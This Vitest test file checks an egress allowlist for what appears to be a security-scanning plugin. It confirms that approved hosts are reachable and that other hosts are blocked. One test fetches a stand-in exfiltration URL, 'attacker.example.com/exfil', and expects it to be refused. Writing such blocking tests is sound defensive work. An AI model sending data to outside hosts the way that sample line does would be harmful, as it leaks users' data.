import { describe, it, expect, beforeEach, vi } from "vitest";
import {
  installEgressAllowlist,
  SnitchEgressBlocked,
  _resetEgressForTests,
} from "../src/_shared/egress.js";

describe("egress allowlist", () => {
  let originalFetch: typeof fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    _resetEgressForTests();
    // Stub fetch to a no-op resolved Response so allow-listed calls don't hit the network.
    globalThis.fetch = vi.fn(async () => new Response("ok")) as typeof fetch;
  });

  function restore() {
    globalThis.fetch = originalFetch;
    _resetEgressForTests();
  }

  it("allows snitchplugin.com", async () => {
    installEgressAllowlist({ provider: "openrouter" });
    const res = await fetch("https://snitchplugin.com/api/skill/version");
    expect(res.ok).toBe(true);
    restore();
  });

  it("allows api.osv.dev", async () => {
    installEgressAllowlist({ provider: "openrouter" });
    const res = await fetch("https://api.osv.dev/v1/query");
    expect(res.ok).toBe(true);
    restore();
  });

  it("allows the selected provider host", async () => {
    installEgressAllowlist({ provider: "anthropic" });
    const res = await fetch("https://api.anthropic.com/v1/messages");
    expect(res.ok).toBe(true);
    restore();
  });

  it("blocks a non-allowlisted host", async () => {
    installEgressAllowlist({ provider: "openrouter" });
    await expect(fetch("https://attacker.example.com/exfil")).rejects.toThrow(
      SnitchEgressBlocked,
    );
    restore();
  });

  it("blocks the wrong provider's host", async () => {
    installEgressAllowlist({ provider: "openrouter" });
    // anthropic isn't on the allowlist for an openrouter run
    await expect(fetch("https://api.anthropic.com/v1/messages")).rejects.toThrow(
      SnitchEgressBlocked,
    );
    restore();
  });

  it("respects extraHosts (e.g. SNITCH_API_BASE override for dev)", async () => {
    installEgressAllowlist({ provider: "openrouter", extraHosts: ["https://localhost:8787"] });
    const res = await fetch("https://localhost:8787/api/scan/event");
    expect(res.ok).toBe(true);
    restore();
  });
});
